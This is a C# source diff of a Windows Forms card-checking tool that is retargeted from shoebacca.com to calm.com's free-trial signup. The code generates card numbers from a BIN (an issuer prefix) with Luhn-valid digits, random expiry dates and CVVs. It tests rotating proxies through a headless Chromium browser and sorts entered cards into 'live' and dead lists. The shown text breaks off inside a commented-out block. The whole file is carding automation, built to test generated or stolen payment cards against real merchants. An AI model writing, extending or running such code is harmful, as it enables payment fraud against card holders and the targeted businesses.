@@ -11,7 +11,6 @@ using System.ComponentModel;
 using System.Drawing;
 using System.Linq;
 using System.Media;
-using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
@@ -19,18 +18,16 @@ using System.Windows.Forms;
 
 namespace Asgard
 {
-    public partial class Odin : Form, IForm
+    public partial class FriggCalm : Form, IForm
     {
         public new IAesir Owner { get; set; }
         public new IChecker OChecker { get; set; }
-        //public new IHome Home { set; get; }
-        //public new IChecker Checker { set; get; }
-
         private string Bin { set; get; }
         private string Quatity { set; get; }
         private int UserId { set; get; }
         private string Token { set; get; }
         private int GateId { set; get; }
+        private string FullName { set; get; }
 
         List<List<string>> CreditCards { set; get; }
         List<List<string>> LiveCreditCards { set; get; }
@@ -38,14 +35,14 @@ namespace Asgard
         List<List<string>> Valkyries { set; get; }
         List<List<string>> LiveValkyries { set; get; }
 
-        #region Range Credit Cards
+        #region RangeCreditCards
         private static readonly string[] rangeAmex = new[] { "34", "37" };//American Express
         private static readonly string[] rangeCUP = new[] { "62" };//China Union Pay
         private static readonly string[] rangeDCCB = new[] { "300-305" };//Diners Club Carte Blanche
-        private static readonly string[] rangeDCI = new[] { "36", "38" };//Diners Club International
+        private static readonly string[] rangeDCI = new[] { "36", "38" };//Diners Club Int32ernational
         private static readonly string[] rangeDCUSC = new[] { "54", "55" };//Diners Club United States & Canada
         private static readonly string[] rangeDC = new[] { "6011", "622126-622925", "644-649", "65" };//Discover Card
-        private static readonly string[] rangeIntP = new[] { "636" };//InterPayment
+        private static readonly string[] rangeInt32P = new[] { "636" };//Int32erPayment
         private static readonly string[] rangeInsP = new[] { "637-639" };//InstaPayment
         private static readonly string[] rangeJCB = new[] { "3528-3589" };//JCB
         private static readonly string[] rangeM = new[] { "50", "56-58", "6" };//Maestro
@@ -58,23 +55,9 @@ namespace Asgard
 
         private static ChromiumWebBrowser browser;
 
-        private const string web = "www.shoebacca.com";
-        private const string initialUrl = "https://" + web;
-        #region middleInitialUrl
-        private static readonly string[] middleInitialUrl = new[] {
-            "/womens-shoes/",
-            "/mens-shoes/",
-            "/kids-shoes/",
-            "/apparel/",
-            "/accessories/",
-            "/clearance-warehouse/clothing/"
-        };
-        #endregion
-
-        private const string lastInitialUrl = "search/price.usd.default/:25?sortBy=sbdefault_products_price_default_asc";
+        private const string initialUrl = "https://app.www.calm.com/subscribe?coupon=freetrial";
 
         private Faker Faker { set; get; }
-
 
         private bool IconButtonGenerarClick = false;
         private bool ShowPanelValkyrie = false;
@@ -83,23 +66,26 @@ namespace Asgard
         private Color IconButtonGenerarIconColor;
         private bool IconButtonGenerarEnabled;
         private bool forsetiError = false;
-        private bool firstTime = true;
 
         private CancellationTokenSource tokenCancel;
+
+        //CancellationToken token;
+
+        //private bool requiredValkyrie = false;
 
         SoundPlayer Valhalla;
         SoundPlayer Valkyrie;
 
         private double OriginalCreditCardsCount;
-        private bool Stop = false;
 
-        public Odin()
+        public FriggCalm()
         {
             InitializeComponent();
             Control.CheckForIllegalCrossThreadCalls = false;
             Faker = new Faker();
         }
-        private void Odin_Load(object sender, EventArgs e)
+
+        private void Frigg_Load(object sender, EventArgs e)
         {
             ControlsInit();
         }
@@ -136,24 +122,26 @@ namespace Asgard
                 form.BringToFront();
             }
         }
+
         private async void IconButtonClose_Click(object sender, EventArgs e)
         {
             PanelConfirm.Show();
             await IconButtonConfirm.OnClickAsync();
-            Owner.HideIconActive("odin");
+            Owner.HideIconActive("friggCalm");
             PanelConfirm.Hide();
             if (browser != null)
             {
-                await browser.Kill(web);
+                await browser.Kill("www.calm.com");
             }
             this.Close();
         }
+
         #endregion
         #region Methods
         private void ControlsInit()
         {
-            Yggdrasil.God = "odin";
-            GateId = 1;
+            Yggdrasil.God = "friggCalm";
+            GateId = 2;
             Bin = string.Empty;
             TextBoxBin.ContextMenuStrip = new ContextMenuStrip();
             TextBoxBin.Placeholder("######xxxxxxxxxx");
@@ -290,14 +278,6 @@ namespace Asgard
                 {
                     e.SuppressKeyPress = false;
                 }
-                else if (e.Control && e.KeyCode == Keys.C)
-                {
-                    e.SuppressKeyPress = false;
-                }
-                else if (e.Control && e.KeyCode == Keys.X)
-                {
-                    e.SuppressKeyPress = false;
-                }
                 else
                 {
                     e.SuppressKeyPress = true;
@@ -307,7 +287,6 @@ namespace Asgard
             }
             catch (Exception) { }
         }
-
         private void TextBoxBin_TextChanged(object sender, EventArgs e)
         {
             TextBox textBox = (TextBox)sender;
@@ -336,7 +315,6 @@ namespace Asgard
                 Task.Run(() => InfoBinList(Bin));
             }
         }
-
         private void TextBoxBin_Validating(object sender, CancelEventArgs e)
         {
             TextBox textBox = (TextBox)sender;
@@ -581,7 +559,7 @@ namespace Asgard
                     await ConsoleProgressGeneral("Iniciando Motor del Generador.", 0);
                     await GenerateCreditCards();
                     await ConsoleProgressGeneral("Material de pago generado correctamente.", 100, "Success");
-                    await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
+                    await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
                     IconButtonGenerarStop.Hide();
                     iconButton.IconColor = Color.White;
                     iconButton.Enabled = true;
@@ -624,7 +602,7 @@ namespace Asgard
         #endregion
         #endregion
         #region Validations
-        public bool ValidateBin(string text)
+        private bool ValidateBin(string text)
         {
             try
             {
@@ -710,7 +688,7 @@ namespace Asgard
         #endregion
         #region Panel Console
         #region Methods
-        public async Task ConsoleProgressGeneral(string info, int value = 101, string status = null)
+        public async Task ConsoleProgressGeneral(string info, int value, string status = null)
         {
             try
             {
@@ -723,23 +701,23 @@ namespace Asgard
                 }
                 else if (status == "Fail")
                 {
-                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
+                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(255, 127, 0);
                     delay = 5000;
                 }
 
-                if (value != 101)
+                if (value < 100)
                 {
                     CircularProgressBarGeneral.Value = value;
                     CircularProgressBarGeneral.Text = CircularProgressBarGeneral.Value.ToString();
                 }
-                //await Task.Delay(100);
+                await Task.Delay(100);
                 LabelInfoGeneralConsole.Text = info;
                 await Task.Delay(delay);
             }
             catch (Exception) {/* throw;*/ }
         }
 
-        public async Task ConsoleProgressDetail(string info, int value = 101, string status = null)
+        public async Task ConsoleProgressDetail(string info, int value, string status = null)
         {
             try
             {
@@ -752,11 +730,11 @@ namespace Asgard
                 }
                 else if (status == "Fail")
                 {
-                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
+                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(255, 127, 0);
                     delay = 5000;
                 }
 
-                if (value != 101)
+                if (value < 100)
                 {
                     CircularProgressBarDetail.Value = value;
                     CircularProgressBarDetail.Text = CircularProgressBarDetail.Value.ToString();
@@ -766,7 +744,7 @@ namespace Asgard
                 LabelInfoGeneralConsole.Text = info;
                 await Task.Delay(delay);
             }
-            catch (Exception) {/* throw;*/ }
+            catch (Exception) { }
         }
         #endregion
         #endregion
@@ -782,8 +760,8 @@ namespace Asgard
                 PanelValkyrieLive.Hide();
                 PanelValkyrieDie.Hide();
                 ShowPanelValkyrie = false;
-                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
-                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
+                await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
+                await ConsoleProgressDetail("FRIGG REINA DE LOS ÆSIR.", 0);
             }
             else
             {
@@ -799,12 +777,11 @@ namespace Asgard
                 PanelValkyrieLive.Show();
                 PanelValkyrieDie.Show();
                 ShowPanelValkyrie = true;
-                await ConsoleProgressGeneral("VALKIRIAS (PROXYS)", 0);
-                await ConsoleProgressDetail("VALKIRIAS (PROXYS)", 0);
+                await ConsoleProgressGeneral("ValquiriaS (PROXYS)", 0);
+                await ConsoleProgressDetail("ValquiriaS (PROXYS)", 0);
             }
         }
         #endregion
-
         #region Methods
         private async Task InfoBinList(string bin = null)
         {
@@ -822,7 +799,6 @@ namespace Asgard
                         pictureBox4.Show();
                         pictureBox5.Show();
                         pictureBox6.Show();
-
 
                         dynamic binList = await Asatru.InfoBin(bin);
                         if (binList != null)
@@ -887,7 +863,7 @@ namespace Asgard
         }
         #endregion
         #region Controls Events
-        private async void TextBoxCreditCards_TextChanged(object sender, EventArgs e)
+        private void TextBoxCreditCards_TextChanged(object sender, EventArgs e)
         {
             TextBox textBox = (TextBox)sender;
             try
@@ -905,25 +881,10 @@ namespace Asgard
                         {
                             string[] listCreditCard = listCreditCards[i].Split('|');
                             CreditCards.Add(new List<string>());
-                            //if (listCreditCard[0].Length >= 12 && listCreditCard[0].Length <= 16)
-                            //{
                             CreditCards[i].Add(listCreditCard[0]);
-                            //}
-                            //else if (listCreditCard[1].Length == 2)
-                            //{
                             CreditCards[i].Add(listCreditCard[1]);
-                            //}
-                            //else if (listCreditCard[2].Length == 4)
-                            //{
                             CreditCards[i].Add(listCreditCard[2]);
-                            //}
-                            //else if (listCreditCard[3].Length >= 3 && listCreditCard[3].Length <= 4)
-                            //{
                             CreditCards[i].Add(listCreditCard[3]);
-                            //}
-                            //else {
-                            //    await ConsoleProgressGeneral("Error en el formato.", 0, "Fail");
-                            //}
                         }
                         if (!IconButtonGenerarClick)
                         {
@@ -985,45 +946,6 @@ namespace Asgard
                 IconButtonClear.Enabled = false;
             }
         }
-
-
-        private async Task<bool> UpCreditCards()
-        {
-            string creditCards = TextBoxCreditCards.Text.Trim();
-            try
-            {
-                if (creditCards.Contains("\r\n"))
-                {
-                    string[] listCreditCards = creditCards.Split(new string[] { "\r\n" }, StringSplitOptions.None);
-                    int listcreditCardsLength = listCreditCards.Length;
-                    CreditCards = new List<List<string>>();
-                    for (int i = 0; i < listcreditCardsLength; i++)
-                    {
-                        string[] listCreditCard = listCreditCards[i].Split('|');
-                        CreditCards.Add(new List<string>());
-                        CreditCards[i].Add(listCreditCard[0]);
-                        CreditCards[i].Add(listCreditCard[1]);
-                        CreditCards[i].Add(listCreditCard[2]);
-                        CreditCards[i].Add(listCreditCard[3]);
-
-                    }
-                }
-                else if (creditCards.Contains("|"))
-                {
-                    CreditCards = new List<List<string>>();
-                    string[] listCreditCard = creditCards.Split('|');
-                    CreditCards.Add(new List<string>());
-                    CreditCards[0].Add(listCreditCard[0]);
-                    CreditCards[0].Add(listCreditCard[1]);
-                    CreditCards[0].Add(listCreditCard[2]);
-                    CreditCards[0].Add(listCreditCard[3]);
-                }
-                return true;
-            }
-            catch (Exception) { }
-            return false;
-        }
-
         private async void IconButtonVerify_Click(object sender, EventArgs e)
         {
             try
@@ -1042,13 +964,10 @@ namespace Asgard
                 IconButtonStop.IconColor = Color.White;
                 IconButtonStop.Enabled = true;
                 //running = true;
-                await UpCreditCards();
                 OriginalCreditCardsCount = CreditCards.Count;
-                await InvokeOdin();
-                await ConsoleProgressGeneral("Odin finalizo Verificación.", 100, "Success");
-                await ConsoleProgressDetail("Odin finalizo Verificación.", 100, "Success");
-                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
-                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
+                await InvokeFrigg();
+                await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
+                await ConsoleProgressDetail("FRIGG REINA DE LOS ÆSIR.", 0);
                 IconButtonClear.IconColor = Color.White;
                 IconButtonClear.Enabled = true;
                 IconButtonValkyrie.IconColor = Color.White;
@@ -1074,9 +993,7 @@ namespace Asgard
             {
                 TextBox textBox = (TextBox)sender;
                 LabelCountValhalla.Text = textBox.Lines.Count().ToString();
-
                 Valhalla.Play();
-
             }
             catch (Exception) { }
         }
@@ -1090,12 +1007,12 @@ namespace Asgard
                 iconButton.Enabled = false;
 
                 await tokenCancel.Kill();
-                await browser.Kill(web);
+                await browser.Kill("www.calm.com");
 
-                await ConsoleProgressGeneral("Odin esta siendo Detenido.", 0, "Success");
-                await ConsoleProgressDetail("Odin esta siendo Detenido.", 0, "Success");
-                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
-                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
+                await ConsoleProgressGeneral("FriggCalm esta siendo detenida.", 0, "Success");
+                await ConsoleProgressDetail("FriggCalm esta siendo detenida.", 0, "Success");
+                await ConsoleProgressGeneral("FRIGG REINA DE LOS ÆSIR.", 0);
+                await ConsoleProgressDetail("FRIGG REINA DE LOS ÆSIR.", 0);
                 IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                 IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                 IconButtonClear.IconColor = Color.White;
@@ -1116,7 +1033,7 @@ namespace Asgard
                         IconButtonVerify.Enabled = false;
                     }
                 }
-                Stop = true;
+
             }
             catch (Exception) { }
         }
@@ -1181,70 +1098,70 @@ namespace Asgard
 
             //  await Task.Factory.StartNew(async () =>
             await Task.Run(async () =>
-             {
-                 if (!token.IsCancellationRequested)
-                 {
-                     string bin = TextBoxBin.Text.Replace("x", string.Empty).Replace("X", string.Empty);
-                     string listCreditCard = string.Empty;
-                     if (bin.Length >= 6)
-                     {
-                         Dictionary<int, int> precision = new Dictionary<int, int>();
-                         RangeAndLength[] range = AllCards();
-                         int rangeLength = range.Length;
-                         for (int j = 0; j < rangeLength; j++)
-                         {
-                             string pattern = @"\b" + range[j].Range;
-                             Match match = Regex.Match(bin, pattern);
-                             if (match.Success)
-                             {
-                                 precision.Add(j, int.Parse(match.Value));
-                             }
-                         }
-                         if (precision.Count > 0)
-                         {
-                             RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
-                             int cardLenght = card.Length;
-                             Quatity = TextBoxQuantity.Text;
-                             int quantity = int.Parse(Quatity);
-                             CreditCards = new List<List<string>>();
-                             for (int i = 0; i < quantity; i++)
-                             {
-                                 double progress = Convert.ToDouble((i + 1) * 100 / quantity);
-                                 await ConsoleProgressGeneral("Generando", (int)Math.Round(progress));
-                                 CreditCards.Add(new List<string>());
-                                 CreditCards[i].Add(CreateCardNumber(bin, cardLenght));
-                                 CreditCards[i].Add(GetDate()[0]);
-                                 CreditCards[i].Add(GetDate()[1]);
-                                 CreditCards[i].Add(GetCvv());
-                                 //await Task.Delay(50);
-                                 if (IconButtonGenerarStopClick)
-                                 {
-                                     IconButtonGenerarStopClick = false;
-                                     await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
-                                     break;
-                                 }
-                             }
+            {
+                if (!token.IsCancellationRequested)
+                {
+                    string bin = TextBoxBin.Text.Replace("x", string.Empty).Replace("X", string.Empty);
+                    string listCreditCard = string.Empty;
+                    if (bin.Length >= 6)
+                    {
+                        Dictionary<int, int> precision = new Dictionary<int, int>();
+                        RangeAndLength[] range = AllCards();
+                        int rangeLength = range.Length;
+                        for (int j = 0; j < rangeLength; j++)
+                        {
+                            string pattern = @"\b" + range[j].Range;
+                            Match match = Regex.Match(bin, pattern);
+                            if (match.Success)
+                            {
+                                precision.Add(j, int.Parse(match.Value));
+                            }
+                        }
+                        if (precision.Count > 0)
+                        {
+                            RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
+                            int cardLenght = card.Length;
+                            Quatity = TextBoxQuantity.Text;
+                            int quantity = int.Parse(Quatity);
+                            CreditCards = new List<List<string>>();
+                            for (int i = 0; i < quantity; i++)
+                            {
+                                double progress = Convert.ToDouble((i + 1) * 100 / quantity);
+                                await ConsoleProgressGeneral("Generando", (int)Math.Round(progress));
+                                CreditCards.Add(new List<string>());
+                                CreditCards[i].Add(CreateCardNumber(bin, cardLenght));
+                                CreditCards[i].Add(GetDate()[0]);
+                                CreditCards[i].Add(GetDate()[1]);
+                                CreditCards[i].Add(GetCvv());
+                                //await Task.Delay(50);
+                                if (IconButtonGenerarStopClick)
+                                {
+                                    IconButtonGenerarStopClick = false;
+                                    await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
+                                    break;
+                                }
+                            }
 
-                             if (CreditCards.Count > 0)
-                             {
-                                 int creditCardsCount = CreditCards.Count;
-                                 for (int i = 0; i < creditCardsCount; i++)
-                                 {
-                                     if (i != creditCardsCount - 1)
-                                     {
-                                         listCreditCard += string.Join("|", CreditCards[i].ToArray()) + "\r\n";
-                                     }
-                                     else
-                                     {
-                                         listCreditCard += string.Join("|", CreditCards[i].ToArray());
-                                     }
-                                 }
-                             }
-                         }
-                     }
-                     TextBoxCreditCards.Text = listCreditCard;
-                 }
-             }, token);
+                            if (CreditCards.Count > 0)
+                            {
+                                int creditCardsCount = CreditCards.Count;
+                                for (int i = 0; i < creditCardsCount; i++)
+                                {
+                                    if (i != creditCardsCount - 1)
+                                    {
+                                        listCreditCard += string.Join("|", CreditCards[i].ToArray()) + "\r\n";
+                                    }
+                                    else
+                                    {
+                                        listCreditCard += string.Join("|", CreditCards[i].ToArray());
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    TextBoxCreditCards.Text = listCreditCard;
+                }
+            }, token);
         }
         private static RangeAndLength[] AllCards()
         {
@@ -1255,7 +1172,7 @@ namespace Asgard
                 Union(BuildRangeAndLengthList(rangeDCUSC, 16)).
                 Union(BuildRangeAndLengthList(rangeDC, 14)).
                 Union(BuildRangeAndLengthList(rangeInsP, 16)).
-                Union(BuildRangeAndLengthList(rangeIntP, 16)).
+                Union(BuildRangeAndLengthList(rangeInt32P, 16)).
                 Union(BuildRangeAndLengthList(rangeJCB, 16)).
                 Union(BuildRangeAndLengthList(rangeM, 16)).
                 Union(BuildRangeAndLengthList(rangeMC, 16)).
@@ -1311,11 +1228,11 @@ namespace Asgard
                 ccnumber += Math.Floor(rnd * 10);
             }
 
-            //reverse number and convert to int
+            // reverse number and convert to int
             IEnumerable<char> reversedCCnumberstring = ccnumber.ToCharArray().Reverse();
             IEnumerable<int> reversedCCnumberList = reversedCCnumberstring.Select(c => Convert.ToInt32(c.ToString()));
 
-            //calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
+            // calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
             int sum = 0;
             int pos = 0;
             int[] reversedCCnumber = reversedCCnumberList.ToArray();
@@ -1398,7 +1315,6 @@ namespace Asgard
             {
                 LabelCountValkyrie.Text = textBox.Lines.Count().ToString();
                 string valkyries = textBox.Text.Trim();
-
                 if (ModifierKeys.HasFlag(Keys.Control))
                 {
                     if (valkyries.Contains("\r\n"))
@@ -1414,7 +1330,6 @@ namespace Asgard
                             Valkyries[i].Add(listValkyrie[1]);
                             Valkyries[i].Add(listValkyrie[2]);
                         }
-
                         if (!IconButtonValkyrieVerifyClick)
                         {
                             IconButtonValkyrieVerify.IconColor = Color.White;
@@ -1464,7 +1379,6 @@ namespace Asgard
                 textBox.Text = string.Empty;
             }
         }
-
         private async void IconButtonValkyrieVerify_Click(object sender, EventArgs e)
         {
             IconButton iconButton = (IconButton)sender;
@@ -1518,7 +1432,6 @@ namespace Asgard
             LabelCountValkyrieLive.Text = textBox.Lines.Count().ToString();
             Valkyrie.Play();
         }
-
         private void IconButtonValkyrieStart_Click(object sender, EventArgs e)
         {
             try
@@ -1556,44 +1469,45 @@ namespace Asgard
             PanelValkyrieDie.Hide();
             ShowPanelValkyrie = false;
         }
-
         private async void IconButtonValkyrieStop_Click(object sender, EventArgs e)
         {
             try
             {
-                IconButton iconButton = (IconButton)sender;
-                iconButton.IconColor = Color.Black;
-                iconButton.Enabled = false;
-
-                await tokenCancel.Kill();
-                await browser.Kill(web);
-
-                await ConsoleProgressGeneral("Valquirias estan siendo Detenidas.", 0, "Success");
-                await ConsoleProgressDetail("Valquirias estan siendo Detenidas.", 0, "Success");
-                await ConsoleProgressGeneral("VALQUIRIAS (PROXYS)", 0);
-                await ConsoleProgressDetail("VALQUIRIAS (PROXYS)", 0);
-
-                IconButtonValkyrieClear.IconColor = Color.White;
-                IconButtonValkyrieClear.Enabled = true;
-                IconButtonValkyrie.IconColor = Color.White;
-                IconButtonValkyrie.Enabled = true;
-                if (Valkyries.Count > 0)
+                if (tokenCancel != null)
                 {
-                    IconButtonValkyrieVerify.IconColor = Color.White;
-                    IconButtonValkyrieVerify.Enabled = true;
-                }
-
-                if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
-                {
-                    if (TextBoxValkyrieLive.Lines.Count() > 0)
+                    IconButton iconbutton = (IconButton)sender;
+                    iconbutton.IconColor = Color.Black;
+                    iconbutton.Enabled = false;
+                    //await browser.Kill();
+                    tokenCancel.Cancel();
+                    tokenCancel.Dispose();
+                    tokenCancel = null;
+                    await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
+                    await ConsoleProgressDetail("¡Detenido!", 0, "Success");
+                    await ConsoleProgressGeneral("ValquiriaS (PROXYS)", 0);
+                    await ConsoleProgressDetail("ValquiriaS (PROXYS)", 0);
+                    IconButtonValkyrieClear.IconColor = Color.White;
+                    IconButtonValkyrieClear.Enabled = true;
+                    IconButtonValkyrie.IconColor = Color.White;
+                    IconButtonValkyrie.Enabled = true;
+                    if (Valkyries.Count > 0)
                     {
-                        IconButtonValkyrieStart.IconColor = Color.White;
-                        IconButtonValkyrieStart.Enabled = true;
-                        IconButtonValkyrie.IconColor = Color.White;
-                        IconButtonValkyrie.Enabled = true;
+                        IconButtonValkyrieVerify.IconColor = Color.White;
+                        IconButtonValkyrieVerify.Enabled = true;
                     }
+
+                    if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
+                    {
+                        if (TextBoxValkyrieLive.Lines.Count() > 0)
+                        {
+                            IconButtonValkyrieStart.IconColor = Color.White;
+                            IconButtonValkyrieStart.Enabled = true;
+                            IconButtonValkyrie.IconColor = Color.White;
+                            IconButtonValkyrie.Enabled = true;
+                        }
+                    }
+                    iconbutton.Hide();
                 }
-                iconButton.Hide();
             }
             catch (Exception) { }
         }
@@ -1608,6 +1522,7 @@ namespace Asgard
             ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.White, ButtonBorderStyle.Solid);
         }
         #endregion
+
         #region Controls Events
         private void TextBoxValkyrieDie_TextChanged(object sender, EventArgs e)
         {
@@ -1617,27 +1532,31 @@ namespace Asgard
         private void IconButtonValkyrieClear_Click(object sender, EventArgs e)
         {
             IconButton iconButton = (IconButton)sender;
-
             iconButton.IconColor = Color.Black;
             iconButton.Enabled = false;
             IconButtonValkyrieVerify.IconColor = Color.Black;
             IconButtonValkyrieVerify.Enabled = false;
             IconButtonValkyrieStart.IconColor = Color.Black;
             IconButtonValkyrieStart.Enabled = false;
-
             TextBoxValkyrie.Text = string.Empty;
             TextBoxValkyrieLive.Text = string.Empty;
             TextBoxValkyrieDie.Text = string.Empty;
-
-            if (Valkyries != null && Valkyries.Count > 0)
+            if (Valkyries != null)
             {
-                Valkyries.Clear();
+                if (Valkyries.Count > 0)
+                {
+                    Valkyries.Clear();
+                }
             }
 
-            if (LiveValkyries != null && LiveValkyries.Count > 0)
+            if (LiveValkyries != null)
             {
-                LiveValkyries.Clear();
+                if (LiveValkyries.Count > 0)
+                {
+                    LiveValkyries.Clear();
+                }
             }
+            IconButtonValkyrieVerifyClick = false;
         }
         #endregion
         #endregion
@@ -1649,13 +1568,13 @@ namespace Asgard
                 string listValkyrieLive = string.Empty;
                 string listValkyrieDie = string.Empty;
                 int valkyriesCount = Valkyries.Count;
-                await ConsoleProgressGeneral("Odin hace llamado a Valquirias.", 0);
+                await ConsoleProgressGeneral("FriggCalm hace llamado a Valquirias.", 0);
                 int x = 0;
                 for (int i = 0; i < valkyriesCount;)
                 {
                     string proxy = Valkyries[i][0] + "://" + Valkyries[i][1] + ":" + Valkyries[i][2];
-                    bool odinVerifyValkyrie = await OdinVerifyValkyrie(proxy);
-                    if (odinVerifyValkyrie)
+                    bool friggVerifyValkyrie = await FriggVerifyValkyrie(proxy);
+                    if (friggVerifyValkyrie)
                     {
                         if (TextBoxValkyrieLive.Text == string.Empty)
                         {
@@ -1669,7 +1588,7 @@ namespace Asgard
                         await ReduceListValkyrie();
                         TextBoxValkyrieLive.Text = listValkyrieLive;
                         double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
-                        await ConsoleProgressGeneral("Odin llamando a Valquirias.", (int)Math.Round(progress));
+                        await ConsoleProgressGeneral("FriggCalm hace llamado a Valquirias.", (int)Math.Round(progress));
                     }
                     else
                     {
@@ -1685,18 +1604,17 @@ namespace Asgard
                         await ReduceListValkyrie();
                         TextBoxValkyrieDie.Text = listValkyrieDie;
                         double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
-                        await ConsoleProgressGeneral("Odin llamando a Valquirias.", (int)Math.Round(progress));
+                        await ConsoleProgressGeneral("FriggCalm hace llamado a Valquirias.", (int)Math.Round(progress));
                     }
                     //await Task.Delay(50);
                     x++;
-
                 }
             }
             catch (Exception) { }
         }
-        private async Task<bool> OdinVerifyValkyrie(string proxy)
+        private async Task<bool> FriggVerifyValkyrie(string proxy)
         {
-            bool odin = false;
+            bool friggCalm = false;
             try
             {
                 browser = new ChromiumWebBrowser();
@@ -1709,45 +1627,45 @@ namespace Asgard
                     await ConsoleProgressDetail("Valquirias preparadas.", 20);
                     if (!token.IsCancellationRequested)
                     {
-                        bool loadPage = await browser.LoadPage(initialUrl, proxy);
+                        string url = initialUrl;
+                        bool loadPage = await browser.LoadPage(url, proxy);
                         await ConsoleProgressDetail("Analizando Valquiria. " + proxy, 40);
                         await Task.Delay(500);
-
                         if (loadPage)
                         {
-                            bool startOdinValkyrie = await StartOdinValkyrie();
-                            if (startOdinValkyrie)
+                            bool startFriggValkyrie = await StartFriggValkyrie();
+                            if (startFriggValkyrie)
                             {
-                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Success");
-                                odin = true;
+                                await ConsoleProgressDetail("Escogida Valquiria. " + proxy, 100, "Success");
+                                friggCalm = true;
                             }
                             else
                             {
-                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Fail");
-                                odin = false;
+                                await ConsoleProgressDetail("Rechazada Valquiria. " + proxy, 100, "Fail");
+                                friggCalm = false;
                             }
                         }
                         else
                         {
-                            await OdinVerifyValkyrie(proxy);
+                            await FriggVerifyValkyrie(proxy);
                         }
                     }
                     else
                     {
-                        odin = false;
+                        friggCalm = false;
                     }
                 }, token);
             }
             catch (Exception) { }
-            return odin;
+            return friggCalm;
         }
 
-        private async Task<bool> StartOdinValkyrie()
+        private async Task<bool> StartFriggValkyrie()
         {
             try
             {
-                await ConsoleProgressDetail("Estado de Valquiria.", 80);
-                if (await browser.ElementVisible("#dropSortBy", "ExceptionStartOdinValkyrie"))
+                await ConsoleProgressDetail("Comprobando estado de Valquiria.", 80);
+                if (await browser.ElementVisible("#product-landing > div > div.c-product-landing__grid-wrapper > div > button", "ExceptionLoadValkyrie"))
                 {
                     return true;
                 }
@@ -1795,20 +1713,18 @@ namespace Asgard
 
         #region Web Browser
         #region Load Browser
-        private async Task InvokeOdin(bool clearCache = true)
+        private async Task InvokeFrigg()
         {
-            bool odin = false;
+            bool friggCalm = false;
             try
             {
-                await ConsoleProgressGeneral("Invocando a Odin.", 0);
-
+                await ConsoleProgressGeneral("Invocando a FriggCalm.", 0);
                 browser = new ChromiumWebBrowser();
                 await Task.Delay(500);
 
                 tokenCancel = new CancellationTokenSource();
                 CancellationToken token = tokenCancel.Token;
-
-                odin = await Task<bool>.Run(async () =>
+                friggCalm = await Task<bool>.Run(async () =>
                 {
                     if (!token.IsCancellationRequested)
                     {
@@ -1822,15 +1738,13 @@ namespace Asgard
             }
             catch (Exception) { }
 
+            //////await browser.Screenshot("100.Last_" + friggCalm.ToString() + "_" + Asatru.GetTimestamp(DateTime.Now));
+            await browser.Kill("www.calm.com");
             await tokenCancel.Kill();
-            if (clearCache)
-            {
-                await browser.Kill(web);
-            }
 
-            if (odin)
+            if (friggCalm)
             {
-                await ConsoleProgressGeneral("Odin finalizo los procesos correctamente.", 100, "Success");
+                await ConsoleProgressGeneral("FriggCalm finalizo los procesos correctamente.", 100, "Success");
                 IconButtonClear.IconColor = Color.White;
                 IconButtonClear.Enabled = true;
                 IconButtonValkyrie.IconColor = Color.White;
@@ -1838,32 +1752,73 @@ namespace Asgard
             }
             else
             {
+
+                //if (!running)
+                //{
+                //    await ConsoleProgressGeneral("FriggCalm fue detenida.", 0, "Fail");
+                //    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
+                //    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
+                //    IconButtonClear.IconColor = Color.White;
+                //    IconButtonClear.Enabled = true;
+                //    IconButtonValkyrie.IconColor = Color.White;
+                //    IconButtonValkyrie.Enabled = true;
+                //    if (CreditCards != null)
+                //    {
+                //        if (CreditCards.Count > 0)
+                //        {
+                //            IconButtonVerify.IconColor = Color.White;
+                //            IconButtonVerify.Enabled = true;
+
+                //        }
+                //        else
+                //        {
+                //            TextBoxCreditCards.Clear();
+                //            IconButtonVerify.IconColor = Color.Black;
+                //            IconButtonVerify.Enabled = false;
+                //        }
+                //    }
+                //}
+                //else if (requiredValkyrie)
+                //{
+                //    await ConsoleProgressGeneral("FriggCalm requiere el apoyo de Valquirias.", 0, "Fail");
+                //    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
+                //    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
+                //    IconButtonClear.IconColor = Color.White;
+                //    IconButtonClear.Enabled = true;
+                //    IconButtonValkyrie.IconColor = Color.White;
+                //    IconButtonValkyrie.Enabled = true;
+                //    if (CreditCards != null)
+                //    {
+                //        if (CreditCards.Count > 0)
+                //        {
+                //            IconButtonVerify.IconColor = Color.White;
+                //            IconButtonVerify.Enabled = true;
+
+                //        }
+                //        else
+                //        {
+                //            TextBoxCreditCards.Clear();
+                //            IconButtonVerify.IconColor = Color.Black;
